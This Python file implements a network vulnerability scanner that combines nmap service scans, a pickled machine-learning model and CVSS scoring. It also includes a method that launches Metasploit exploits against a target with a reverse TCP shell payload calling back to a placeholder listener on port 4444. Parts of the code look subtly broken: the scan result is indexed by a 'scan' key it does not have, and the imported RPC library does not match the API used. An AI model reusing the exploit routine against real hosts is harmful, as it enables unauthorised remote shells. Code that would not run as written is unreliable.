import os
import sys
import logging
import argparse
import pickle
import json
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from nmap import PortScanner
from cvss import CVSS3
from msfrpc import MsfRpcClient
from datetime import datetime
import requests

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class NetworkVulnerabilityScanner:
    def __init__(self, vulnerability_feed_url, msf_rpc_password, report_dir, model_path, vectorizer_path):
        self.vulnerability_feed_url = vulnerability_feed_url
        self.report_dir = self.validate_report_directory(report_dir)
        self.model_path = model_path
        self.vectorizer_path = vectorizer_path
        self.ml_model, self.vectorizer = self.load_ml_assets(model_path, vectorizer_path)
        self.scanner = PortScanner()
        self.msf_client = MsfRpcClient(msf_rpc_password)

    def load_ml_assets(self, model_path, vectorizer_path):
        try:
            with open(model_path, 'rb') as model_file, open(vectorizer_path, 'rb') as vectorizer_file:
                model = pickle.load(model_file)
                vectorizer = pickle.load(vectorizer_file)
            return model, vectorizer
        except FileNotFoundError as e:
            logging.error(f'File not found: {e}')
            sys.exit(1)
    
    def validate_report_directory(self, report_dir):
        if not os.path.exists(report_dir):
            os.makedirs(report_dir)
        return report_dir
    
    def scan_network(self, target):
        self.scanner.scan(target, arguments='-sV')
        logging.info(f'Scan completed for {target}')
        return self.scanner[target]
    
    def fetch_vulnerability_feed(self):
        response = requests.get(self.vulnerability_feed_url)
        response.raise_for_status()
        return response.json()

    def assess_vulnerabilities(self, scan_data):
        vulnerability_feed = self.fetch_vulnerability_feed()
        vulnerabilities = []
        for host, scan_result in scan_data['scan'].items():
            for proto in scan_result.get('tcp', {}):
                service_info = scan_result['tcp'][proto]
                features = self.extract_features(service_info)
                prediction = self.ml_model.predict([features])
                cvss_vector = vulnerability_feed.get(service_info['name'], {}).get('cvss_vector', '')
                vulnerabilities.append({
                    'host': host,
                    'port': proto,
                    'service': service_info['name'],
                    'version': service_info['version'],
                    'prediction': prediction[0],
                    'cvss_vector': cvss_vector,
                    'cvss_score': self.calculate_cvss(cvss_vector)
                })
        return vulnerabilities
    
    def extract_features(self, service_info):
        service_data = f"{service_info['name']} {service_info['product']} {service_info['version']}"
        feature_vector = self.vectorizer.transform([service_data]).toarray()[0]
        return feature_vector
    
    def calculate_cvss(self, cvss_vector):
        if cvss_vector:
            score = CVSS3(cvss_vector).scores()[0]
            return score
        return None

    def generate_report(self, vulnerabilities):
        report_path = os.path.join(self.report_dir, f'vulnerability_report_{datetime.now().strftime("%Y%m%d%H%M%S")}.json')
        with open(report_path, 'w') as report_file:
            json.dump(vulnerabilities, report_file, indent=4)
        logging.info(f'Report generated at {report_path}')
    
    def exploit_vulnerability(self, target, exploit):
        exploit_module = self.msf_client.modules.use('exploit', exploit)
        exploit_module['RHOSTS'] = target
        payload = self.msf_client.modules.use('payload', 'generic/shell_reverse_tcp')
        payload['LHOST'] = 'your_local_host'  # Replace with your IP
        payload['LPORT'] = 4444  # Listening port
        job_id = exploit_module.execute(payload=payload)
        return job_id

def parse_arguments():
    parser = argparse.ArgumentParser(description='Network Vulnerability Scanner with AI/ML Integration')
    parser.add_argument('-u', '--url', required=True, help='Vulnerability feed URL or file path')
    parser.add_argument('-p', '--password', required=True, help='Metasploit RPC password')
    parser.add_argument('-d', '--directory', required=True, help='Directory to save reports')
    parser.add_argument('-m', '--model', required=True, help='Path to the trained ML model')
    parser.add_argument('-v', '--vectorizer', required=True, help='Path to the trained vectorizer')
    parser.add_argument('-t', '--target', required=True, help='Target network or host to scan')
    return parser.parse_args()

def main():
    args = parse_arguments()
    scanner = NetworkVulnerabilityScanner(
        args.url, 
        args.password, 
        args.directory, 
        args.model, 
        args.vectorizer
    )
    scan_data = scanner.scan_network(args.target)
    vulnerabilities = scanner.assess_vulnerabilities(scan_data)
    scanner.generate_report(vulnerabilities)

if __name__ == '__main__':
    main()
